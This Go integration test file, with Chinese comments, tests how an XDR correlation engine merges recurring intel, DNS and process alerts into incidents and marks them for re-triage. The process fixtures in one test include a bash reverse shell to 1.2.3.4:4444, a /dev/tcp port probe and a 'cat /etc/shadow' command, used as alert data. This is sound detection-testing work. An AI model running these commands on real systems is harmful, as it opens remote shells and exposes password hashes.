//go:build integration

package correlate

import (
	"context"
	"encoding/json"
	"testing"
	"time"

	"github.com/google/uuid"

	"openxdr/server/ent"
	"openxdr/server/ent/schema"
	"openxdr/server/internal/review"
	"openxdr/server/internal/sigma"
	"openxdr/server/internal/testdb"
)

// 复发归并的测试夹具：情报 IP 入站连接、DNS 查询两类告警，按资产与时间造。
type recurFixture struct {
	t      *testing.T
	ctx    context.Context
	client *ent.Client
	eng    *Engine
}

func newRecurFixture(t *testing.T) *recurFixture {
	ctx, client := testdb.New(t)
	return &recurFixture{t: t, ctx: ctx, client: client, eng: &Engine{
		DB: client, Rules: &sigma.Engine{}, Window: 30 * time.Minute,
		MaxGraphNodes: 50, RecurSpan: 24 * time.Hour, RecurCoarse: true,
	}}
}

func (f *recurFixture) alert(asset uuid.UUID, ts time.Time, ruleID string, sev int16, class int, raw string) *ent.Alert {
	f.t.Helper()
	evt := f.client.Event.Create().SetTs(ts).SetClassUID(class).SetSource("agent").
		SetAssetID(asset).SetRaw(json.RawMessage(raw)).SaveX(f.ctx)
	return f.client.Alert.Create().SetTs(ts).SetRuleID(ruleID).SetSeverity(sev).
		SetEventID(evt.ID).SetAssetID(asset).SaveX(f.ctx)
}

// scan 情报 IP 对本机 443 的一次入站连接
func (f *recurFixture) scan(asset uuid.UUID, ts time.Time, ip string) *ent.Alert {
	raw := `{"connection_info":{"direction":"inbound"},"src_endpoint":{"ip":"` + ip +
		`","port":63625},"dst_endpoint":{"ip":"10.1.1.100","port":443},"container":{"runtime":"lxc","uid":"100","name":"gateway"}}`
	return f.alert(asset, ts, "intel:ip:"+ip, 3, 4001, raw)
}

func (f *recurFixture) dns(asset uuid.UUID, ts time.Time, host string) *ent.Alert {
	return f.alert(asset, ts, "r-dns-tld", 2, 4003, `{"query":{"hostname":"`+host+`"}}`)
}

func (f *recurFixture) batch() {
	f.t.Helper()
	if err := f.eng.batch(f.ctx); err != nil {
		f.t.Fatalf("batch 失败: %v", err)
	}
}

func (f *recurFixture) incidentOf(al *ent.Alert) *ent.Incident {
	f.t.Helper()
	got := f.client.Alert.GetX(f.ctx, al.ID)
	if got.IncidentID == nil {
		f.t.Fatalf("告警 %s 未归属", al.RuleID)
	}
	return f.client.Incident.GetX(f.ctx, *got.IncidentID)
}

func (f *recurFixture) asset(name string) uuid.UUID {
	return f.client.Asset.Create().SetHostname(name).SaveX(f.ctx).ID
}

// 生产实例：同一情报 IP 每隔几小时扫一次同一台主机，已研判的 incident 收下复发、不记新证据；
// 跨批次与批内两条路径都要并。
func TestRecurrenceMergesAcrossHours(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("pve1")
	base := time.Now().Add(-12 * time.Hour)

	first := f.scan(host, base, "176.120.22.61")
	f.batch()
	inc := f.incidentOf(first)
	f.client.Incident.UpdateOneID(inc.ID).SetStatus("triaged").SetNotifiedAt(time.Now()).SetTriagedAt(time.Now()).
		SetAiVerdict(json.RawMessage(`{"verdict":"benign"}`)).ExecX(f.ctx)

	// 跨批次：4 小时后再来一次
	second := f.scan(host, base.Add(4*time.Hour), "176.120.22.61")
	f.batch()
	// 批内：两条相隔 3 小时的复发同批到达
	third := f.scan(host, base.Add(7*time.Hour), "176.120.22.61")
	fourth := f.scan(host, base.Add(10*time.Hour), "176.120.22.61")
	f.batch()

	for _, al := range []*ent.Alert{second, third, fourth} {
		if got := f.incidentOf(al); got.ID != inc.ID {
			t.Errorf("复发告警 %s 应并入 %s，实际 %s", al.Ts, inc.ID, got.ID)
		}
	}
	if n := f.client.Incident.Query().CountX(f.ctx); n != 1 {
		t.Fatalf("同实体复发应只有 1 个 incident，实际 %d", n)
	}
	got := f.client.Incident.GetX(f.ctx, inc.ID)
	if got.Status != "triaged" || review.IsRetriage(got) || got.NotifiedAt == nil {
		t.Errorf("同级复发不是新证据，不应待重研判或重新推送：status=%s evidence=%v notified=%v", got.Status, got.EvidenceAt, got.NotifiedAt)
	}

	// 级别升高（情报更新后该 IP 定级变高）：立即重研判，推送标记清掉重新决定
	worse := f.scan(host, base.Add(11*time.Hour), "176.120.22.61")
	f.client.Alert.UpdateOneID(worse.ID).SetSeverity(5).ExecX(f.ctx)
	f.batch()
	got = f.client.Incident.GetX(f.ctx, inc.ID)
	if f.incidentOf(worse).ID != inc.ID || !review.IsUrgent(got) || got.NotifiedAt != nil {
		t.Errorf("级别升高应并入、立即重研判、清推送标记：urgent=%v notified=%v", got.UrgentAt, got.NotifiedAt)
	}
}

// 不同情报 IP、不同域名、不同主机都是不同的事，不能并。
func TestRecurrenceKeepsEntitiesApart(t *testing.T) {
	f := newRecurFixture(t)
	hostA := f.asset("pve1")
	hostB := f.asset("pve2")
	base := time.Now().Add(-12 * time.Hour)

	scanA := f.scan(hostA, base, "176.120.22.61")
	dnsA := f.dns(hostA, base.Add(2*time.Hour), "ghfast.top")
	f.batch()

	otherIP := f.scan(hostA, base.Add(4*time.Hour), "130.12.180.32")
	otherHost := f.scan(hostB, base.Add(4*time.Hour), "176.120.22.61")
	otherDomain := f.dns(hostA, base.Add(6*time.Hour), "music-zone-h5.allsaints.top")
	sameDomain := f.dns(hostA, base.Add(8*time.Hour), "GHFast.top")
	f.batch()

	seen := map[uuid.UUID]string{}
	for name, al := range map[string]*ent.Alert{
		"scanA": scanA, "dnsA": dnsA, "otherIP": otherIP, "otherHost": otherHost, "otherDomain": otherDomain,
	} {
		id := f.incidentOf(al).ID
		if prev, dup := seen[id]; dup {
			t.Errorf("%s 与 %s 是不同实体，不应并进同一个 incident", name, prev)
		}
		seen[id] = name
	}
	if f.incidentOf(sameDomain).ID != f.incidentOf(dnsA).ID {
		t.Error("同一域名（大小写不同）的复发应并入")
	}
}

// 已结案的 incident 不重开：复发另起一个，让人带着新证据重新看。
func TestRecurrenceSkipsResolved(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("pve1")
	base := time.Now().Add(-12 * time.Hour)

	first := f.scan(host, base, "176.120.22.61")
	f.batch()
	closed := f.incidentOf(first)
	f.client.Incident.UpdateOneID(closed.ID).SetStatus("false_positive").ExecX(f.ctx)

	again := f.scan(host, base.Add(4*time.Hour), "176.120.22.61")
	f.batch()
	if got := f.incidentOf(again); got.ID == closed.ID || got.Status != "open" {
		t.Errorf("已结案不应并入：got %s status=%s", got.ID, got.Status)
	}
	if s := f.client.Incident.GetX(f.ctx, closed.ID).Status; s != "false_positive" {
		t.Errorf("已结案 incident 状态被改动：%s", s)
	}
}

// 跨度上限：incident 起始超过 RecurSpan 后复发新开，一个 incident 不无限拉长。
func TestRecurrenceSpanLimit(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("pve1")
	now := time.Now()

	first := f.scan(host, now.Add(-2*time.Hour), "176.120.22.61")
	f.batch()
	old := f.incidentOf(first)
	f.client.Incident.UpdateOneID(old.ID).SetCreatedAt(now.Add(-25 * time.Hour)).ExecX(f.ctx)

	late := f.scan(host, now, "176.120.22.61")
	f.batch()
	fresh := f.incidentOf(late)
	if fresh.ID == old.ID {
		t.Fatal("超过跨度上限的复发应新开 incident")
	}

	// 新开的这个随后接着收复发
	next := f.scan(host, now.Add(3*time.Hour), "176.120.22.61")
	f.batch()
	if f.incidentOf(next).ID != fresh.ID {
		t.Error("后续复发应并入新开的 incident")
	}
}

// proc 一条进程告警：执行用户在事件信封上，父进程映像在 raw 里
func (f *recurFixture) proc(asset uuid.UUID, ts time.Time, rule, user, image, parent, cmd string) *ent.Alert {
	f.t.Helper()
	raw, _ := json.Marshal(map[string]any{"process": map[string]any{
		"cmd_line": cmd, "file": map[string]any{"path": image},
		"parent_process": map[string]any{"file": map[string]any{"path": parent}},
	}})
	evt := f.client.Event.Create().SetTs(ts).SetClassUID(1007).SetSource("agent").
		SetAssetID(asset).SetUsername(user).SetRaw(raw).SaveX(f.ctx)
	return f.client.Alert.Create().SetTs(ts).SetRuleID(rule).SetSeverity(2).
		SetEventID(evt.ID).SetAssetID(asset).SaveX(f.ctx)
}

// 粗键：同映像同用户同父进程、命令行不同的复发并入（跨批次与批内）；首次出现规则按主机+用户+父进程并。
// 已研判的 incident 收到命令行不同的同类告警记为新证据、待重研判，但不清推送标记；完全相同的复发不算。
func TestRecurrenceCoarseMerges(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("pve2")
	base := time.Now().Add(-20 * time.Hour)

	first := f.proc(host, base, "r-lvm", "root", "/sbin/lvcreate", "/usr/bin/perl", "lvcreate -V 4096k --name vm-145")
	f.batch()
	inc := f.incidentOf(first)
	f.client.Incident.UpdateOneID(inc.ID).SetStatus("triaged").SetNotifiedAt(time.Now()).SetTriagedAt(time.Now()).
		SetAiVerdict(json.RawMessage(`{"verdict":"benign"}`)).ExecX(f.ctx)

	same := f.proc(host, base.Add(3*time.Hour), "r-lvm", "root", "/usr/sbin/lvcreate", "/usr/bin/perl", "lvcreate -V 4096k --name vm-145")
	f.batch()
	if f.incidentOf(same).ID != inc.ID {
		t.Fatal("同映像同命令行的复发应并入")
	}
	if got := f.client.Incident.GetX(f.ctx, inc.ID); got.Status != "triaged" || review.IsRetriage(got) {
		t.Errorf("完全相同的复发不是新证据，不应待重研判：%s %v", got.Status, got.EvidenceAt)
	}

	other := f.proc(host, base.Add(6*time.Hour), "r-lvm", "root", "/usr/sbin/lvcreate", "/usr/bin/perl", "lvcreate -V 8192k --name vm-146")
	inBatch := f.proc(host, base.Add(9*time.Hour), "r-lvm", "root", "/sbin/lvcreate", "/usr/bin/perl", "lvcreate -V 1024k --name vm-147")
	f.batch()
	for _, al := range []*ent.Alert{other, inBatch} {
		if f.incidentOf(al).ID != inc.ID {
			t.Errorf("命令行不同的同类告警 %s 应按粗键并入", al.Ts)
		}
	}
	got := f.client.Incident.GetX(f.ctx, inc.ID)
	if !review.IsRetriage(got) || review.IsUrgent(got) || got.NotifiedAt == nil {
		t.Errorf("粗键并入的不同命令行应待重研判（不立即）、同级不重新推送：evidence=%v urgent=%v notified=%v", got.EvidenceAt, got.UrgentAt, got.NotifiedAt)
	}

	// 首次出现：每条映像都不同，同主机同用户同父进程的并成一件
	other2 := f.asset("pve1")
	a := f.proc(other2, base, "xdr:new-process", "root", "/usr/bin/fstrim", "/usr/lib/systemd/systemd", "fstrim -av")
	f.batch()
	b := f.proc(other2, base.Add(5*time.Hour), "xdr:new-process", "root", "/usr/sbin/kpartx", "/usr/lib/systemd/systemd", "kpartx -av")
	f.batch()
	if f.incidentOf(a).ID != f.incidentOf(b).ID {
		t.Error("首次出现的新程序同主机同用户同父进程应并入")
	}
	if n := f.client.Incident.Query().CountX(f.ctx); n != 2 {
		t.Errorf("应只有 2 个 incident，实际 %d", n)
	}
}

// 粗键不错并：解释器执行不同命令、不同用户、不同父进程、不同资产各自成案；开关关闭时退回精确键。
func TestRecurrenceCoarseKeepsApart(t *testing.T) {
	f := newRecurFixture(t)
	hostA := f.asset("pve1")
	hostB := f.asset("pve2")
	base := time.Now().Add(-20 * time.Hour)

	shell := f.proc(hostA, base, "r-shell", "root", "/usr/bin/bash", "/usr/sbin/sshd", "bash -c 'for p in 22 80; do echo > /dev/tcp/10.1.1.10/$p; done'")
	pgrep := f.proc(hostB, base, "r-pgrep", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep -a agent")
	f.batch()

	otherShell := f.proc(hostA, base.Add(3*time.Hour), "r-shell", "root", "/bin/bash", "/usr/sbin/sshd", "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
	f.batch()
	wrapped := f.proc(hostA, base.Add(6*time.Hour), "r-shell", "root", "/usr/bin/timeout", "/usr/sbin/sshd", "timeout 3 bash -c 'cat /etc/shadow'")
	f.batch()
	wrappedAgain := f.proc(hostA, base.Add(9*time.Hour), "r-shell", "root", "/usr/bin/timeout", "/usr/sbin/sshd", "timeout 3 bash -c 'id'")
	otherUser := f.proc(hostB, base.Add(3*time.Hour), "r-pgrep", "www-data", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep -a nginx")
	f.batch()
	otherParent := f.proc(hostB, base.Add(6*time.Hour), "r-pgrep", "root", "/usr/bin/pgrep", "/usr/sbin/sshd", "pgrep -a nginx")
	otherHost := f.proc(hostA, base.Add(12*time.Hour), "r-pgrep", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep -a nginx")
	f.batch()

	seen := map[uuid.UUID]string{}
	for name, al := range map[string]*ent.Alert{
		"shell": shell, "pgrep": pgrep, "otherShell": otherShell, "wrapped": wrapped, "wrappedAgain": wrappedAgain,
		"otherUser": otherUser, "otherParent": otherParent, "otherHost": otherHost,
	} {
		id := f.incidentOf(al).ID
		if prev, dup := seen[id]; dup {
			t.Errorf("%s 与 %s 不应并进同一个 incident", name, prev)
		}
		seen[id] = name
	}

	// 关闭粗键：命令行不同的同类告警不再并入
	f.eng.RecurCoarse = false
	again := f.proc(hostB, base.Add(9*time.Hour), "r-pgrep", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep -a sshd")
	f.batch()
	if f.incidentOf(again).ID == f.incidentOf(pgrep).ID {
		t.Error("CORRELATE_RECUR_COARSE 关闭时不应按粗键并入")
	}
}

// 粗键沿用复发归并的口径：已结案不并、超过跨度上限新开、级别升高立即重研判并清推送标记；
// 高危（级别 ≥ 4）不按粗键复发，另开 incident。
func TestRecurrenceCoarseLimits(t *testing.T) {
	f := newRecurFixture(t)
	hostA := f.asset("pve1")
	hostB := f.asset("pve2")
	hostC := f.asset("pve3")
	now := time.Now()

	closedFirst := f.proc(hostA, now.Add(-10*time.Hour), "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep a")
	oldFirst := f.proc(hostB, now.Add(-10*time.Hour), "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep a")
	triagedFirst := f.proc(hostC, now.Add(-10*time.Hour), "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep a")
	f.batch()
	closed := f.incidentOf(closedFirst)
	f.client.Incident.UpdateOneID(closed.ID).SetStatus("false_positive").ExecX(f.ctx)
	old := f.incidentOf(oldFirst)
	f.client.Incident.UpdateOneID(old.ID).SetCreatedAt(now.Add(-25 * time.Hour)).ExecX(f.ctx)
	triaged := f.incidentOf(triagedFirst)
	f.client.Incident.UpdateOneID(triaged.ID).SetStatus("triaged").SetNotifiedAt(now).SetTriagedAt(now).ExecX(f.ctx)

	afterClose := f.proc(hostA, now, "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep b")
	afterSpan := f.proc(hostB, now, "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep b")
	worse := f.proc(hostC, now, "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep b")
	f.client.Alert.UpdateOneID(worse.ID).SetSeverity(3).ExecX(f.ctx)
	f.batch()
	high := f.proc(hostC, now.Add(time.Hour), "r-a", "root", "/usr/bin/pgrep", "/usr/sbin/cron", "pgrep c")
	f.client.Alert.UpdateOneID(high.ID).SetSeverity(5).ExecX(f.ctx)
	f.batch()
	if f.incidentOf(high).ID == triaged.ID {
		t.Error("高危不应按粗键并入")
	}

	if f.incidentOf(afterClose).ID == closed.ID {
		t.Error("已结案的 incident 不应按粗键并入")
	}
	if s := f.client.Incident.GetX(f.ctx, closed.ID).Status; s != "false_positive" {
		t.Errorf("已结案 incident 状态被改动：%s", s)
	}
	if f.incidentOf(afterSpan).ID == old.ID {
		t.Error("超过跨度上限不应按粗键并入")
	}
	got := f.client.Incident.GetX(f.ctx, triaged.ID)
	if f.incidentOf(worse).ID != triaged.ID || !review.IsUrgent(got) || got.NotifiedAt != nil {
		t.Errorf("级别升高应并入、立即重研判、清推送标记：urgent=%v notified=%v", got.UrgentAt, got.NotifiedAt)
	}
}

// 已研判的 incident 并入新证据：普通的只待重研判（等冷却）；头一回出现的高危例外规则（情报命中等）立即重研判，
// 但同一条高危规则再来不算升级，免得它自己成风暴；级别没升高不清推送标记
func TestEvidenceMarksRetriage(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("pve1")
	base := time.Now().Add(-time.Hour)

	first := f.dns(host, base, "a.example.top")
	f.batch()
	inc := f.incidentOf(first)
	settle := func() {
		f.client.Incident.UpdateOneID(inc.ID).SetStatus("triaged").SetTriagedAt(time.Now()).SetNotifiedAt(time.Now()).ExecX(f.ctx)
	}
	settle()

	other := f.dns(host, base.Add(time.Minute), "b.example.top")
	f.batch()
	got := f.client.Incident.GetX(f.ctx, inc.ID)
	if f.incidentOf(other).ID != inc.ID || !review.IsRetriage(got) || review.IsUrgent(got) {
		t.Fatalf("同规则新实体应待重研判、不立即：evidence=%v urgent=%v", got.EvidenceAt, got.UrgentAt)
	}

	settle()
	hit := f.alert(host, base.Add(2*time.Minute), "intel:domain:evil.example", 2, 4003, `{"query":{"hostname":"evil.example"}}`)
	f.batch()
	got = f.client.Incident.GetX(f.ctx, inc.ID)
	if f.incidentOf(hit).ID != inc.ID || !review.IsUrgent(got) || got.NotifiedAt == nil {
		t.Fatalf("头一回出现的情报命中应立即重研判、级别未升不清推送标记：urgent=%v notified=%v", got.UrgentAt, got.NotifiedAt)
	}

	settle()
	f.alert(host, base.Add(3*time.Minute), "intel:domain:evil.example", 2, 4003, `{"query":{"hostname":"evil.example"}}`)
	f.batch()
	if got = f.client.Incident.GetX(f.ctx, inc.ID); review.IsUrgent(got) || review.IsRetriage(got) {
		t.Errorf("同一情报再命中既不是升级也不是新证据：evidence=%v urgent=%v", got.EvidenceAt, got.UrgentAt)
	}
}

func TestNewEvidenceInvalidatesClosureProposal(t *testing.T) {
	f := newRecurFixture(t)
	host := f.asset("closure-host")
	base := time.Now().Add(-time.Hour)
	first := f.dns(host, base, "a.example.top")
	f.batch()
	inc := f.incidentOf(first)
	f.client.Incident.UpdateOneID(inc.ID).SetStatus("triaged").SetTriagedAt(time.Now()).
		SetClosureProposal(&schema.ClosureProposal{Status: "false_positive", Note: "已核实为良性", At: time.Now()}).ExecX(f.ctx)
	f.dns(host, base.Add(time.Minute), "a.example.top")
	f.batch()
	if f.client.Incident.GetX(f.ctx, inc.ID).ClosureProposal == nil {
		t.Fatal("相同证据重复不能清除建议")
	}
	next := f.dns(host, base.Add(2*time.Minute), "b.example.top")
	f.batch()
	got := f.incidentOf(next)
	if got.ID != inc.ID || got.ClosureProposal != nil || !review.IsRetriage(got) {
		t.Fatal("新证据应清除旧建议并待重研判")
	}
}
